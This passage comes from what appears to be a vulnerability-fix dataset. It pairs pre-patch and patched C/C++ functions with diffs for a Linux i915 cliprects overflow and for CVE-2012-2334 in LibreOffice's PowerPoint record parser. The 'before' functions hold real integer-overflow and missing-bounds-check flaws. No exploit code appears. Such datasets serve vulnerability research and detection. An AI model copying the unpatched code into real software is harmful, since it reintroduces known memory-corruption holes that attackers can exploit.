        "func": "static int\ni915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\n\t\tif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {\n\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",\n\t\t\t\t  args->num_cliprects);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n\t\t\t\t    GFP_KERNEL);\n\t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -85,6 +85,11 @@\n \t\t\treturn -EINVAL;\n \t\t}\n \n+\t\tif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {\n+\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",\n+\t\t\t\t  args->num_cliprects);\n+\t\t\treturn -EINVAL;\n+\t\t}\n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\tif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {",
                "\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",",
                "\t\t\t\t  args->num_cliprects);",
                "\t\t\treturn -EINVAL;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2334",
        "func_name": "libreoffice/core/SvxMSDffManager::ReadCommonRecordHeader",
        "description": "Integer overflow in filter/source/msfilter/msdffimp.cxx in OpenOffice.org (OOo) 3.3, 3.4 Beta, and possibly earlier, and LibreOffice before 3.5.3, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via the length of an Escher graphics record in a PowerPoint (.ppt) document, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/libreoffice/core/commit/?id=28a6558f9d3ca2dda3191f8b5b3f2378ee2533da",
        "commit_title": "",
        "commit_text": "",
        "func_before": "bool SvxMSDffManager::ReadCommonRecordHeader(SvStream& rSt,\n    sal_uInt8& rVer, sal_uInt16& rInst, sal_uInt16& rFbt, sal_uInt32& rLength)\n{\n    sal_uInt16 nTmp(0);\n    rSt >> nTmp >> rFbt >> rLength;\n    rVer = sal::static_int_cast< sal_uInt8 >(nTmp & 15);\n    rInst = nTmp >> 4;\n    if (!rSt.good())\n        return false;\n    if (rLength > nMaxLegalRecordLength)\n        return false;\n    return true;\n}",
        "func": "bool SvxMSDffManager::ReadCommonRecordHeader(SvStream& rSt,\n    sal_uInt8& rVer, sal_uInt16& rInst, sal_uInt16& rFbt, sal_uInt32& rLength)\n{\n    sal_uInt16 nTmp(0);\n    rSt >> nTmp >> rFbt >> rLength;\n    rVer = sal::static_int_cast< sal_uInt8 >(nTmp & 15);\n    rInst = nTmp >> 4;\n    if (!rSt.good())\n        return false;\n    if (rLength > nMaxLegalDffRecordLength)\n        return false;\n    return true;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,7 +7,7 @@\n     rInst = nTmp >> 4;\n     if (!rSt.good())\n         return false;\n-    if (rLength > nMaxLegalRecordLength)\n+    if (rLength > nMaxLegalDffRecordLength)\n         return false;\n     return true;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    if (rLength > nMaxLegalRecordLength)"
            ],
            "added_lines": [
                "    if (rLength > nMaxLegalDffRecordLength)"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2334",
        "func_name": "libreoffice/core/SvxMSDffManager::SeekToRec",
        "description": "Integer overflow in filter/source/msfilter/msdffimp.cxx in OpenOffice.org (OOo) 3.3, 3.4 Beta, and possibly earlier, and LibreOffice before 3.5.3, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via the length of an Escher graphics record in a PowerPoint (.ppt) document, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/libreoffice/core/commit/?id=28a6558f9d3ca2dda3191f8b5b3f2378ee2533da",
        "commit_title": "",
        "commit_text": "",
        "func_before": "bool SvxMSDffManager::SeekToRec( SvStream& rSt, sal_uInt16 nRecId, sal_uLong nMaxFilePos, DffRecordHeader* pRecHd, sal_uLong nSkipCount ) const\n{\n    bool bRet = sal_False;\n    sal_uLong nFPosMerk = rSt.Tell(); // FilePos merken fuer ggf. spaetere Restauration\n    DffRecordHeader aHd;\n    do\n    {\n        rSt >> aHd;\n        if (!rSt.good())\n            break;\n        if ( aHd.nRecType == nRecId )\n        {\n            if ( nSkipCount )\n                nSkipCount--;\n            else\n            {\n                bRet = sal_True;\n                if ( pRecHd != NULL )\n                    *pRecHd = aHd;\n                else\n                    aHd.SeekToBegOfRecord( rSt );\n            }\n        }\n        if ( !bRet )\n        {\n            bool bSeekSuccess = aHd.SeekToEndOfRecord( rSt );\n            if (!bSeekSuccess)\n                break;\n        }\n    }\n    while ( rSt.good() && rSt.Tell() < nMaxFilePos && !bRet );\n    if ( !bRet )\n        rSt.Seek( nFPosMerk );  // FilePos restaurieren\n    return bRet;\n}",
        "func": "bool SvxMSDffManager::SeekToRec( SvStream& rSt, sal_uInt16 nRecId, sal_uLong nMaxFilePos, DffRecordHeader* pRecHd, sal_uLong nSkipCount ) const\n{\n    bool bRet = sal_False;\n    sal_uLong nFPosMerk = rSt.Tell(); // FilePos merken fuer ggf. spaetere Restauration\n    DffRecordHeader aHd;\n    do\n    {\n        rSt >> aHd;\n        if (!rSt.good())\n            break;\n        if (aHd.nRecLen > nMaxLegalDffRecordLength)\n            break;\n        if ( aHd.nRecType == nRecId )\n        {\n            if ( nSkipCount )\n                nSkipCount--;\n            else\n            {\n                bRet = sal_True;\n                if ( pRecHd != NULL )\n                    *pRecHd = aHd;\n                else\n                    aHd.SeekToBegOfRecord( rSt );\n            }\n        }\n        if ( !bRet )\n        {\n            bool bSeekSuccess = aHd.SeekToEndOfRecord( rSt );\n            if (!bSeekSuccess)\n                break;\n        }\n    }\n    while ( rSt.good() && rSt.Tell() < nMaxFilePos && !bRet );\n    if ( !bRet )\n        rSt.Seek( nFPosMerk );  // FilePos restaurieren\n    return bRet;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,6 +7,8 @@\n     {\n         rSt >> aHd;\n         if (!rSt.good())\n+            break;\n+        if (aHd.nRecLen > nMaxLegalDffRecordLength)\n             break;\n         if ( aHd.nRecType == nRecId )\n         {",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "            break;",
                "        if (aHd.nRecLen > nMaxLegalDffRecordLength)"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2334",
        "func_name": "libreoffice/core/SvxMSDffManager::ReadCommonRecordHeader",
        "description": "Integer overflow in filter/source/msfilter/msdffimp.cxx in OpenOffice.org (OOo) 3.3, 3.4 Beta, and possibly earlier, and LibreOffice before 3.5.3, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via the length of an Escher graphics record in a PowerPoint (.ppt) document, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/libreoffice/core/commit/?id=512401decb286ba0fc3031939b8f7de8649c502e",
        "commit_title": "",
        "commit_text": "",
        "func_before": "bool SvxMSDffManager::ReadCommonRecordHeader(SvStream& rSt,\n    sal_uInt8& rVer, sal_uInt16& rInst, sal_uInt16& rFbt, sal_uInt32& rLength)\n{\n    sal_uInt16 nTmp(0);\n    rSt >> nTmp >> rFbt >> rLength;\n    rVer = sal::static_int_cast< sal_uInt8 >(nTmp & 15);\n    rInst = nTmp >> 4;\n    return rSt.good();\n}",
        "func": "bool SvxMSDffManager::ReadCommonRecordHeader(SvStream& rSt,\n    sal_uInt8& rVer, sal_uInt16& rInst, sal_uInt16& rFbt, sal_uInt32& rLength)\n{\n    sal_uInt16 nTmp(0);\n    rSt >> nTmp >> rFbt >> rLength;\n    rVer = sal::static_int_cast< sal_uInt8 >(nTmp & 15);\n    rInst = nTmp >> 4;\n    if (!rSt.good())\n        return false;\n    if (rLength > nMaxLegalRecordLength)\n        return false;\n    return true;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,5 +5,9 @@\n     rSt >> nTmp >> rFbt >> rLength;\n     rVer = sal::static_int_cast< sal_uInt8 >(nTmp & 15);\n     rInst = nTmp >> 4;\n-    return rSt.good();\n+    if (!rSt.good())\n+        return false;\n+    if (rLength > nMaxLegalRecordLength)\n+        return false;\n+    return true;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    return rSt.good();"
            ],
            "added_lines": [
                "    if (!rSt.good())",
                "        return false;",
                "    if (rLength > nMaxLegalRecordLength)",
                "        return false;",
                "    return true;"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2334",
        "func_name": "libreoffice/core/SvxMSDffManager::SeekToShape",
        "description": "Integer overflow in filter/source/msfilter/msdffimp.cxx in OpenOffice.org (OOo) 3.3, 3.4 Beta, and possibly earlier, and LibreOffice before 3.5.3, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via the length of an Escher graphics record in a PowerPoint (.ppt) document, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/libreoffice/core/commit/?id=512401decb286ba0fc3031939b8f7de8649c502e",
        "commit_title": "",
        "commit_text": "",
        "func_before": "sal_Bool SvxMSDffManager::SeekToShape( SvStream& rSt, void* /* pClientData */, sal_uInt32 nId ) const\n{\n    sal_Bool bRet = sal_False;\n    if ( mpFidcls )\n    {\n        sal_uInt32 nMerk = rSt.Tell();\n        sal_uInt32 nShapeId, nSec = ( nId >> 10 ) - 1;\n        if ( nSec < mnIdClusters )\n        {\n            sal_IntPtr nOfs = (sal_IntPtr)maDgOffsetTable.Get( mpFidcls[ nSec ].dgid );\n            if ( nOfs )\n            {\n                rSt.Seek( nOfs );\n                DffRecordHeader aEscherF002Hd;\n                rSt >> aEscherF002Hd;\n                sal_uLong nEscherF002End = aEscherF002Hd.GetRecEndFilePos();\n                DffRecordHeader aEscherObjListHd;\n                while ( rSt.Tell() < nEscherF002End )\n                {\n                    rSt >> aEscherObjListHd;\n                    if ( aEscherObjListHd.nRecVer != 0xf )\n                        aEscherObjListHd.SeekToEndOfRecord( rSt );\n                    else if ( aEscherObjListHd.nRecType == DFF_msofbtSpContainer )\n                    {\n                        DffRecordHeader aShapeHd;\n                        if ( SeekToRec( rSt, DFF_msofbtSp, aEscherObjListHd.GetRecEndFilePos(), &aShapeHd ) )\n                        {\n                            rSt >> nShapeId;\n                            if ( nId == nShapeId )\n                            {\n                                aEscherObjListHd.SeekToBegOfRecord( rSt );\n                                bRet = sal_True;\n                                break;\n                            }\n                        }\n                        aEscherObjListHd.SeekToEndOfRecord( rSt );\n                    }\n                }\n            }\n        }\n        if ( !bRet )\n            rSt.Seek( nMerk );\n    }\n    return bRet;\n}",
        "func": "sal_Bool SvxMSDffManager::SeekToShape( SvStream& rSt, void* /* pClientData */, sal_uInt32 nId ) const\n{\n    sal_Bool bRet = sal_False;\n    if ( mpFidcls )\n    {\n        sal_uInt32 nMerk = rSt.Tell();\n        sal_uInt32 nShapeId, nSec = ( nId >> 10 ) - 1;\n        if ( nSec < mnIdClusters )\n        {\n            sal_IntPtr nOfs = (sal_IntPtr)maDgOffsetTable.Get( mpFidcls[ nSec ].dgid );\n            if ( nOfs )\n            {\n                rSt.Seek( nOfs );\n                DffRecordHeader aEscherF002Hd;\n                rSt >> aEscherF002Hd;\n                sal_uLong nEscherF002End = aEscherF002Hd.GetRecEndFilePos();\n                DffRecordHeader aEscherObjListHd;\n                while (rSt.good() && rSt.Tell() < nEscherF002End)\n                {\n                    rSt >> aEscherObjListHd;\n                    if ( aEscherObjListHd.nRecVer != 0xf )\n                        aEscherObjListHd.SeekToEndOfRecord( rSt );\n                    else if ( aEscherObjListHd.nRecType == DFF_msofbtSpContainer )\n                    {\n                        DffRecordHeader aShapeHd;\n                        if ( SeekToRec( rSt, DFF_msofbtSp, aEscherObjListHd.GetRecEndFilePos(), &aShapeHd ) )\n                        {\n                            rSt >> nShapeId;\n                            if ( nId == nShapeId )\n                            {\n                                aEscherObjListHd.SeekToBegOfRecord( rSt );\n                                bRet = sal_True;\n                                break;\n                            }\n                        }\n                        aEscherObjListHd.SeekToEndOfRecord( rSt );\n                    }\n                }\n            }\n        }\n        if ( !bRet )\n            rSt.Seek( nMerk );\n    }\n    return bRet;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -15,7 +15,7 @@\n                 rSt >> aEscherF002Hd;\n                 sal_uLong nEscherF002End = aEscherF002Hd.GetRecEndFilePos();\n                 DffRecordHeader aEscherObjListHd;\n-                while ( rSt.Tell() < nEscherF002End )\n+                while (rSt.good() && rSt.Tell() < nEscherF002End)\n                 {\n                     rSt >> aEscherObjListHd;\n                     if ( aEscherObjListHd.nRecVer != 0xf )",
        "diff_line_info": {
            "deleted_lines": [
                "                while ( rSt.Tell() < nEscherF002End )"
            ],
            "added_lines": [
                "                while (rSt.good() && rSt.Tell() < nEscherF002End)"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2334",
        "func_name": "libreoffice/core/SvxMSDffManager::SeekToRec",
        "description": "Integer overflow in filter/source/msfilter/msdffimp.cxx in OpenOffice.org (OOo) 3.3, 3.4 Beta, and possibly earlier, and LibreOffice before 3.5.3, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via the length of an Escher graphics record in a PowerPoint (.ppt) document, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/libreoffice/core/commit/?id=512401decb286ba0fc3031939b8f7de8649c502e",
        "commit_title": "",
        "commit_text": "",
        "func_before": "bool SvxMSDffManager::SeekToRec( SvStream& rSt, sal_uInt16 nRecId, sal_uLong nMaxFilePos, DffRecordHeader* pRecHd, sal_uLong nSkipCount ) const\n{\n    bool bRet = sal_False;\n    sal_uLong nFPosMerk = rSt.Tell(); // FilePos merken fuer ggf. spaetere Restauration\n    DffRecordHeader aHd;\n    do\n    {\n        rSt >> aHd;\n        if ( aHd.nRecType == nRecId )\n        {\n            if ( nSkipCount )\n                nSkipCount--;\n            else\n            {\n                bRet = sal_True;\n                if ( pRecHd != NULL )\n                    *pRecHd = aHd;\n                else\n                    aHd.SeekToBegOfRecord( rSt );\n            }\n        }\n        if ( !bRet )\n            aHd.SeekToEndOfRecord( rSt );\n    }\n    while ( rSt.GetError() == 0 && rSt.Tell() < nMaxFilePos && !bRet );\n    if ( !bRet )\n        rSt.Seek( nFPosMerk );  // FilePos restaurieren\n    return bRet;\n}",
        "func": "bool SvxMSDffManager::SeekToRec( SvStream& rSt, sal_uInt16 nRecId, sal_uLong nMaxFilePos, DffRecordHeader* pRecHd, sal_uLong nSkipCount ) const\n{\n    bool bRet = sal_False;\n    sal_uLong nFPosMerk = rSt.Tell(); // FilePos merken fuer ggf. spaetere Restauration\n    DffRecordHeader aHd;\n    do\n    {\n        rSt >> aHd;\n        if (!rSt.good())\n            break;\n        if ( aHd.nRecType == nRecId )\n        {\n            if ( nSkipCount )\n                nSkipCount--;\n            else\n            {\n                bRet = sal_True;\n                if ( pRecHd != NULL )\n                    *pRecHd = aHd;\n                else\n                    aHd.SeekToBegOfRecord( rSt );\n            }\n        }\n        if ( !bRet )\n        {\n            bool bSeekSuccess = aHd.SeekToEndOfRecord( rSt );\n            if (!bSeekSuccess)\n                break;\n        }\n    }\n    while ( rSt.good() && rSt.Tell() < nMaxFilePos && !bRet );\n    if ( !bRet )\n        rSt.Seek( nFPosMerk );  // FilePos restaurieren\n    return bRet;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,6 +6,8 @@\n     do\n     {\n         rSt >> aHd;\n+        if (!rSt.good())\n+            break;\n         if ( aHd.nRecType == nRecId )\n         {\n             if ( nSkipCount )\n@@ -20,9 +22,13 @@\n             }\n         }\n         if ( !bRet )\n-            aHd.SeekToEndOfRecord( rSt );\n+        {\n+            bool bSeekSuccess = aHd.SeekToEndOfRecord( rSt );\n+            if (!bSeekSuccess)\n+                break;\n+        }\n     }\n-    while ( rSt.GetError() == 0 && rSt.Tell() < nMaxFilePos && !bRet );\n+    while ( rSt.good() && rSt.Tell() < nMaxFilePos && !bRet );\n     if ( !bRet )\n         rSt.Seek( nFPosMerk );  // FilePos restaurieren\n     return bRet;",
        "diff_line_info": {
            "deleted_lines": [
                "            aHd.SeekToEndOfRecord( rSt );",
                "    while ( rSt.GetError() == 0 && rSt.Tell() < nMaxFilePos && !bRet );"
            ],
            "added_lines": [
                "        if (!rSt.good())",
                "            break;",
                "        {",
                "            bool bSeekSuccess = aHd.SeekToEndOfRecord( rSt );",
                "            if (!bSeekSuccess)",
                "                break;",
                "        }",
                "    while ( rSt.good() && rSt.Tell() < nMaxFilePos && !bRet );"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2334",
        "func_name": "libreoffice/core/SvxMSDffManager::GetFidclData",
        "description": "Integer overflow in filter/source/msfilter/msdffimp.cxx in OpenOffice.org (OOo) 3.3, 3.4 Beta, and possibly earlier, and LibreOffice before 3.5.3, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via the length of an Escher graphics record in a PowerPoint (.ppt) document, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/libreoffice/core/commit/?id=512401decb286ba0fc3031939b8f7de8649c502e",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void SvxMSDffManager::GetFidclData( sal_uInt32 nOffsDggL )\n{\n    if (!nOffsDggL)\n        return;\n\n    sal_uInt32 nDummy, nMerk = rStCtrl.Tell();\n\n    if (nOffsDggL == rStCtrl.Seek(nOffsDggL))\n    {\n        DffRecordHeader aRecHd;\n        rStCtrl >> aRecHd;\n\n        DffRecordHeader aDggAtomHd;\n        if ( SeekToRec( rStCtrl, DFF_msofbtDgg, aRecHd.GetRecEndFilePos(), &aDggAtomHd ) )\n        {\n            aDggAtomHd.SeekToContent( rStCtrl );\n            rStCtrl >> mnCurMaxShapeId\n                    >> mnIdClusters\n                    >> nDummy\n                    >> mnDrawingsSaved;\n\n            if ( mnIdClusters-- > 2 )\n            {\n                if ( aDggAtomHd.nRecLen == ( mnIdClusters * sizeof( FIDCL ) + 16 ) )\n                {\n                    mpFidcls = new FIDCL[ mnIdClusters ];\n                    for ( sal_uInt32 i = 0; i < mnIdClusters; i++ )\n                    {\n                        rStCtrl >> mpFidcls[ i ].dgid\n                                >> mpFidcls[ i ].cspidCur;\n                    }\n                }\n            }\n        }\n    }\n    rStCtrl.Seek( nMerk );\n}",
        "func": "void SvxMSDffManager::GetFidclData( sal_uInt32 nOffsDggL )\n{\n    if (!nOffsDggL)\n        return;\n\n    sal_uInt32 nDummy, nMerk = rStCtrl.Tell();\n\n    if (nOffsDggL == rStCtrl.Seek(nOffsDggL))\n    {\n        DffRecordHeader aRecHd;\n        rStCtrl >> aRecHd;\n\n        DffRecordHeader aDggAtomHd;\n        if ( SeekToRec( rStCtrl, DFF_msofbtDgg, aRecHd.GetRecEndFilePos(), &aDggAtomHd ) )\n        {\n            aDggAtomHd.SeekToContent( rStCtrl );\n            rStCtrl >> mnCurMaxShapeId\n                    >> mnIdClusters\n                    >> nDummy\n                    >> mnDrawingsSaved;\n\n            if ( mnIdClusters-- > 2 )\n            {\n                const sal_Size nFIDCLsize = sizeof(sal_uInt32) * 2;\n                if ( aDggAtomHd.nRecLen == ( mnIdClusters * nFIDCLsize + 16 ) )\n                {\n                    sal_Size nMaxEntriesPossible = rStCtrl.remainingSize() / nFIDCLsize;\n                    SAL_WARN_IF(nMaxEntriesPossible < mnIdClusters,\n                        \"escher\", \"FIDCL list longer than remaining bytes, ppt or parser is wrong\");\n                    mnIdClusters = std::min(nMaxEntriesPossible, static_cast<sal_Size>(mnIdClusters));\n\n                    mpFidcls = new FIDCL[ mnIdClusters ];\n                    memset(mpFidcls, 0, mnIdClusters * sizeof(FIDCL));\n                    for (sal_uInt32 i = 0; i < mnIdClusters; ++i)\n                    {\n                        rStCtrl >> mpFidcls[ i ].dgid\n                                >> mpFidcls[ i ].cspidCur;\n                    }\n                }\n            }\n        }\n    }\n    rStCtrl.Seek( nMerk );\n}",
